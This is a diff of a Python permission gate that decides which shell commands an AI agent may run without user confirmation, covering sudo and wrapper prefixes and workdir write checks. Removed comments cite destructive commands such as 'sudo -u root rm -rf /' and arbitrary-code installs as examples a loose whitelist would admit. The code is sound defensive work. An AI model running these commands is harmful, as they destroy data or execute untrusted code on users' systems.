@@ -1066,71 +562,43 @@ class PermissionGate:
                 return WhitelistRule(tool=tool.name, kind="prefix", pattern=prefix)
             if _has_code_exec_flag(arg_text):
                 return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
-            # 包装器两词前缀收尾在旗标/赋值上时不是安全前缀：`sudo -u` 之后的
-            # 命令是任意 root 操作，`nice -n` / `timeout -s` 同理——真实命令词
-            # 还没出现，前缀实质是「这个包装器的任意参数」，必须改为 exact
-            # （对抗审查第二轮：旧实现会为 `sudo -u root python manage.py x`
-            # 提炼 `sudo -u`，批准一次后 `sudo -u root rm -rf /` 免确认）
-            if (
-                len(words) >= 2
-                and _norm_exe_name(words[0]) in _WRAPPER_COMMANDS
-                and (words[1].startswith("-") or _is_var_assignment(words[1]))
-            ):
-                return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
-            # 审查 SEC-M01：任意执行面守卫与「可信真实命令词」判定都落在**首个
-            # 真实命令词**上（与匹配侧 _hits_unsafe_entry_command /
-            # _is_arbitrary_exec_prefix 同一扫描、同一清单）——`TAG=latest
-            # docker build` / `env docker build` / `sudo docker build` 的首词是
-            # 赋值或包装器，旧实现只看 words[0]，会沉淀出 "TAG=latest docker"
-            # 这类免确认放行任意 `docker run` 的宽前缀。提炼不出可信真实命令词
-            # （全是前置赋值/包装器收尾，如 `FOO=bar`、裸 `sudo`）同样不产前缀
-            # ——宽前缀等于放行「该前缀后接任意命令」，fail-closed 只固化当次
-            # 参数。F6.1：提权包装器锚在赋值之后时（`FOO=1 sudo apt install`）
-            # 旧实现的三词分支只认 words[0] 是 sudo，命令落进下面的两词分支
-            # 沉淀 "FOO=1 sudo"，把 `FOO=1 sudo apt install` 与 `FOO=1 sudo
-            # rm -rf /` 合并成同一放行面——钉不住三词形状的提权命令（旗标/
-            # 词数/赋值收尾）一律 exact，与匹配侧共用 _sudo_prefix_shape_unsafe。
-            real = _first_real_command_word(_tokenize(arg_text))
+            real = _first_real_command_word(tokens)
             if (
                 real is None
                 or real in _PREFIX_UNSAFE_COMMANDS
-                or _sudo_prefix_shape_unsafe(words)
+                or _sudo_prefix_shape_unsafe(tokens)
             ):
                 return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
-            # 前缀提炼锚在「首个非前置赋值词」上（与上面的判定同一锚定口径），
-            # 前置赋值原样垫在前缀前（`FOO=1 git status` → "FOO=1 git status"）
-            # ——赋值不改变命令语义，但前缀必须把真实命令词钉进放行面，不能
-            # 停在赋值上（旧 words[:2] 对 `FOO=1 sudo apt install` 只沉淀到
-            # "FOO=1 sudo"，对 `FOO=1 git status` 只沉淀到 "FOO=1 git"，两者
-            # 都把其后任意命令合并进同一放行面）。
-            # 提权锚可能垫在包装器/赋值之后（nohup sudo / timeout 10 sudo）：
-            # 用 _sudo_anchor_index 与匹配侧同一口径定位，取「锚词及后两词」
-            # 三词前缀，别停在 "nohup sudo" 这种两词宽前缀上。
-            sudo_lead = _sudo_anchor_index(words)
+            sudo_lead = _sudo_anchor_index(tokens)
             if sudo_lead is not None:
-                # 能走到这里说明 _sudo_prefix_shape_unsafe 已判 False：锚词后
-                # 必有两个非旗标、非赋值的词，切片不会越界。
-                prefix3 = " ".join(words[: sudo_lead + 3])
-                # 执行族收窄（审查 H2）：`sudo tar x <归档>` 与 `sudo npm install
-                # <任意URL>` 提权后仍是整族任意执行面，与两词分支同一清单。
+                slice_len = sudo_lead + 3
+                if any(any(c.isspace() for c in t) for t in tokens[:slice_len]):
+                    return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
+                prefix3 = " ".join(words[:slice_len])
                 if narrow_exec_families and _prefix_deletes_or_runs_arbitrary(prefix3):
                     return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
                 return WhitelistRule(tool=tool.name, kind="prefix", pattern=prefix3)
-            lead = 0
-            while lead < len(words) and _is_var_assignment(words[lead]):
-                lead += 1
-            if lead >= len(words):
+            # 非提权路径将沉淀两词前缀：若两词前缀收尾在包装器旗标/赋值/时长上
+            # （`nice -n`、`timeout -s`、`timeout 10` 等），真实命令词还没进前缀，
+            # 必须回退 exact（`timeout 10 sudo apt install` 已走上方 5 词提权分支）。
+            if (
+                len(tokens) >= 2
+                and _norm_exe_name(tokens[0]) in _WRAPPER_COMMANDS
+                and (tokens[1].startswith("-") or _is_var_assignment(tokens[1])
+                     or _is_wrapper_duration_token(_norm_exe_name(tokens[0]), tokens[1]))
+            ):
                 return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
-            # 其余命令取「锚词 + 下一词」两词前缀，如 "git status" / "npm run"，
-            # 避免把整条命令固化；赋值序列原样垫前
-            prefix = " ".join(words[:lead + 2]) if words else arg_text
-            # 执行族收窄（审查 H2）：两词前缀落在删除 / 任意子命令执行族时等于
-            # 整族放行——批准一次 `npm install left-pad` 后，`npm install
-            # <任意URL>`（远程包 postinstall=任意代码）永久免确认，
-            # `tar x --to-command=…` 同理。命中改固化 exact，只放行用户当时
-            # 批准的那一条；清单与匹配侧（_matches_core）、模板通道
-            # （GrantedGate._prefix_usable / collab_templates）同一份，
-            # 见 _prefix_deletes_or_runs_arbitrary。
+            lead = 0
+            while lead < len(tokens) and _is_var_assignment(tokens[lead]):
+                lead += 1
+            if lead >= len(tokens):
+                return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
+            # 引号内带空格（如 `"C:\Program Files\app.exe" status`）按空白切分
+            # 会把引号劈成两半；含空白 token 时改固化 exact，避免残缺引号前缀
+            slice_len = lead + 2
+            if any(any(c.isspace() for c in t) for t in tokens[:slice_len]):
+                return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
+            prefix = " ".join(words[:slice_len]) if words else arg_text
             if narrow_exec_families and _prefix_deletes_or_runs_arbitrary(prefix):
                 return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
             return WhitelistRule(tool=tool.name, kind="prefix", pattern=prefix)
@@ -1340,6 +808,29 @@ class PermissionGate:
             if not self._path_inside_workdir(str(input_dict.get(extra, "") or "")):
                 return False
         return True
+
+
+    def _isolated_write_allowed(
+        self,
+        tool: Tool,
+        input_dict: dict,
+        *,
+        confirm_gate: PermissionGate | None = None,
+        force_pending: bool = False,
+    ) -> bool:
+        """隔离子 worktree 写入是否可免确认直接放行（IsolatedGate / TeamIsolatedGate 共用）。"""
+        if tool.safety != Safety.WRITE or force_pending:
+            return False
+        if self._write_hits_engine_home(tool, input_dict):
+            return False
+        ref = confirm_gate or self
+        extra_fn = getattr(ref, "_extra_confirm_required", None)
+        if callable(extra_fn) and extra_fn(tool, input_dict):
+            return False
+        del_fn = getattr(ref, "_write_is_actually_delete", None)
+        if callable(del_fn) and del_fn(tool, input_dict):
+            return False
+        return self._write_target_inside_workdir(tool, input_dict)
 
     def _write_in_bounds(self, tool: Tool, input_dict: dict) -> bool:
         """名单自动放行前的写入边界（审计 L02）：写类工具的落点必须在工作目录内。
@@ -1679,225 +1170,6 @@ class PermissionGate:
         if self.on_request:
             await self.on_request(pending)
         return pending
-
-    # 写入类工具的改前→改后预览；仅限工作目录内的文本文件，失败静默降级为无 diff
-    DIFF_PREVIEW_MAX_LINES = 160
-
-    def _preview_diff(self, tool: Tool, input_dict: dict) -> str:
-        if not self.working_dir:
-            return ""
-        if tool.name in ("move_file", "delete_file"):
-            return self._preview_fs_impact(tool, input_dict)
-        if tool.name not in ("write_file", "edit_file", "write_document"):
-            return ""
-        raw = str(input_dict.get("path", "") or "")
-        if not raw:
-            return ""
-        target = Path(raw)
-        if not target.is_absolute():
-            target = self.working_dir / target
-        try:
-            target.resolve().relative_to(self.working_dir)
-        except (OSError, ValueError):
-            return ""  # 工作目录之外：不给预览（工具层还会拦）
-        try:
-            old = self._read_text_for_preview(target)
-        except OSError:
-            return ""
-        if tool.name == "write_file":
-            new = str(input_dict.get("content", "") or "")
-        elif tool.name == "write_document":
-            # 确认弹窗展示源内容（Markdown/JSON）预览；.csv 是文本可做真实 diff，
-            # 覆盖已有 docx/xlsx 时旧内容是二进制，给不出有意义的文本 diff
-            if target.exists() and target.suffix.lower() != ".csv":
-                return ""
-            new = str(input_dict.get("content", "") or "")
-        else:  # edit_file：按工具语义模拟替换
-            old_s = input_dict.get("old_string")
-            new_s = input_dict.get("new_string")
-            if not isinstance(old_s, str) or not isinstance(new_s, str) or old_s not in old:
-                return ""
-            count = -1 if input_dict.get("replace_all") else 1
-            new = old.replace(old_s, new_s, count)
-        if old == new:
-            return ""
-        lines = list(
-            difflib.unified_diff(
-                old.splitlines(), new.splitlines(),
-                fromfile="改前", tofile="改后", lineterm="",
-            )
-        )
-        if len(lines) > self.DIFF_PREVIEW_MAX_LINES:
-            rest = len(lines) - self.DIFF_PREVIEW_MAX_LINES
-            lines = lines[: self.DIFF_PREVIEW_MAX_LINES] + [f"…（余 {rest} 行省略）"]
-        return "\n".join(lines)
-
-    @staticmethod
-    def _read_text_for_preview(target: Path) -> str:
-        """读旧内容做 diff 预览：按探测到的编码读（GBK 文件预览不再是乱码）。
-
-        探不出编码 / 是二进制时退回 utf-8 忽略错误，旧内容仅用于展示。
-        """
-        from ..textio import decode_bytes
-
-        if not target.is_file():
-            return ""
-        loaded = decode_bytes(target.read_bytes()[:400_000])
-        if loaded.binary or not loaded.certain:
-            return target.read_text(encoding="utf-8", errors="replace")
-        return loaded.text
-
-    def _preview_fs_impact(self, tool: Tool, input_dict: dict) -> str:
-        """move_file / delete_file 的确认预览：列出将被处置的实际路径。
-
-        删除与移动没有「改前→改后文本 diff」可言，但用户需要看到的恰恰是
-        「到底动哪些东西」。目录递归时把内容完整列出来（超长截断），
-        避免确认弹窗上只有一个模糊的目录名。
-
-        读取边界（既有确认设计）：预览只读取**工作目录内**的目录树/文件内容
-        ——目标落在工作目录之外（含 ``../`` 相对逃逸）时不逐条枚举，但覆盖
-        删除的披露不能静默省略：至少给出真实落点路径 + 类型/大小的元数据
-        （authorize 期的 _delete_shape 本就对目录外落点做 is_dir 级 stat），
-        并注明「预览不列出其内容」。
-        """
-
-        def resolve(raw: str) -> Path | None:
-            if not raw:
-                return None
-            p = Path(raw)
-            if not p.is_absolute():
-                p = self.working_dir / p
-            try:
-                p = p.resolve()
-                p.relative_to(self.working_dir)
-            except (OSError, ValueError):
-                return None
-            return p
-
-        def outside_landing_line(target: Path) -> str:
-            """工作目录之外的覆盖落点：明确告知覆盖删除，披露真实路径与
-            类型/大小（仅元数据），不枚举内容。"""
-            try:
-                kind = "目录" if target.is_dir() else "文件"
-                size = f"，{target.stat().st_size:,} B" if kind == "文件" else ""
-            except OSError:
-                kind, size = "文件", ""
-            note = "，预览不列出其内容" if kind == "目录" else ""
-            return f"将覆盖删除：{target}（{kind}{size}，位于工作目录之外{note}）"
-
-        if tool.name == "move_file":
-            src = resolve(str(input_dict.get("source", "") or ""))
-            if src is None:
-                return ""
-            dst_raw = str(input_dict.get("destination", "") or "")
-            dst = resolve(dst_raw)
-            if dst is not None:
-                # 工作目录内：与执行侧（tools/fs.py）同一套落点语义——目标是
-                # 已存在的目录就移进去保留原名，预览披露的删除面按真实落点算。
-                if dst.is_dir():
-                    dst = dst / src.name
-            else:
-                # 工作目录之外（含 ../ 相对逃逸）、解析失败或空目标：执行侧的
-                # resolve_path（默认不限制工作目录）照样会解析出真实落点并按
-                # overwrite 覆盖删除——预览不能因 resolve() 的目录内限定就漏
-                # 披露（M02 复核缺口）。相对 raw 先拼 working_dir 再归一化，
-                # 目录内移语义与执行侧保持一致。
-                raw_dst = Path(dst_raw)
-                if not raw_dst.is_absolute():
-                    raw_dst = self.working_dir / raw_dst
-                try:
-                    raw_dst = raw_dst.resolve()
-                except OSError:
-                    pass
-                dst = raw_dst / src.name if raw_dst.is_dir() else raw_dst
-            lines = [f"移动：{src} → {dst}"]
-            if src.exists():
-                lines += self._list_tree_lines(src, label="将移动")
-            # 审查 M02：overwrite=true 且真实落点已存在时，这次移动会先删掉
-            # 落点上的既有内容（目录是 shutil.rmtree 整棵子树）——预览必须把
-            # 「被覆盖删除的东西」连同递归删除警示一起摆到确认卡上，不能只
-            # 展示将移入的文件。overwrite=false 时工具层会因「目标已存在」
-            # 报错、什么都不会删，因此不做任何删除预告（不误报）。
-            # 落点仍在工作目录内才逐文件列树；之外按 outside_landing_line
-            # 明确披露（真实路径 + 类型/大小），不静默省略也不越界枚举。
-            if input_dict.get("overwrite") and dst.exists():
-                try:
-                    dst.relative_to(self.working_dir)
-                    inside = True
-                except ValueError:
-                    inside = False
-                if dst.is_dir() and src.is_dir():
-                    lines += (self._list_tree_lines(dst, label="将覆盖删除")
-                              if inside else [outside_landing_line(dst)])
-                    lines.append(
-                        "⚠️ 覆盖会先递归删除上面列出的整个目录（含全部内容）再移入；"
-                        "要保留请先换个目标名或把旧目录改名。"
-                    )
-                elif not dst.is_dir():
-                    lines += (self._list_tree_lines(dst, label="将覆盖删除")
-                              if inside else [outside_landing_line(dst)])
-                    lines.append("⚠️ 覆盖将删除并替换上面这个已有文件（旧内容进检查点，可回滚）。")
-                # src 是文件而落点是目录：工具层会拒绝执行（无法覆盖），不预告删除
-            return "\n".join(lines)
-
-        target = resolve(str(input_dict.get("path", "") or ""))
-        if target is None:
-            return ""
-        lines = [f"删除：{target}"]
-        if target.exists():
-            lines += self._list_tree_lines(target, label="将删除")
-        return "\n".join(lines)
-
-    TREE_PREVIEW_MAX = 120
-
-    # 目录预览扫描的条目上限：node_modules 级目录动辄十万+，全量 rglob + 排序 +
-    # 逐文件 stat 在极端目录上是 O(n log n) 次系统调用。确认弹窗只需要「大概
-    # 多大、动哪些东西」，超过上限就按已扫到的部分给结论并注明「可能更多」。
-    TREE_PREVIEW_SCAN_MAX = 20_000
-
-    def _list_tree_lines(self, target: Path, label: str) -> list[str]:
-        """列出文件 / 目录下的条目（确认弹窗用），超长截断。"""
-        if target.is_file():
-            try:
-                size = target.stat().st_size
-            except OSError:
-                return [f"{label}：{target.name}"]
-            return [f"{label}：{target.name}（{size:,} B）"]
-        try:
-            # 手动带计数地迭代，命上限即停——sorted 会先物化整棵树
-            entries = []
-            truncated_scan = False
-            for i, e in enumerate(target.rglob("*")):
-                if i >= self.TREE_PREVIEW_SCAN_MAX:
-                    truncated_scan = True
-                    break
-                entries.append(e)
-            entries.sort()
-        except OSError:
-            return []
-        files = [e for e in entries if e.is_file()]
-        total = 0
-        for f in files:
-            try:
-                total += f.stat().st_size
-            except OSError:
-                pass
-        lines = [f"{label}：整个目录，{len(files)} 个文件，共 {total:,} B"]
-        for e in files[: self.TREE_PREVIEW_MAX]:
-            try:
-                lines.append("  " + str(e.relative_to(target)))
-            except ValueError:
-                lines.append("  " + str(e))
-        if len(files) > self.TREE_PREVIEW_MAX:
-            lines.append(f"  …（其余 {len(files) - self.TREE_PREVIEW_MAX} 个文件省略）")
-        if truncated_scan:
-            # 扫描本身就到了上限：不能把「已扫到的」当成「全部的」展示——
-            # 确认卡上必须让用户知道实际规模可能更大（删目录是不可逆操作）
-            lines.append(
-                f"  …（目录过大，仅扫描前 {self.TREE_PREVIEW_SCAN_MAX:,} 个条目，"
-                "实际文件数可能更多）"
-            )
-        return lines
 
     async def persist_rule(self, rule: WhitelistRule) -> None:
         """把"永久允许"规则写入项目存储并立即生效。"""
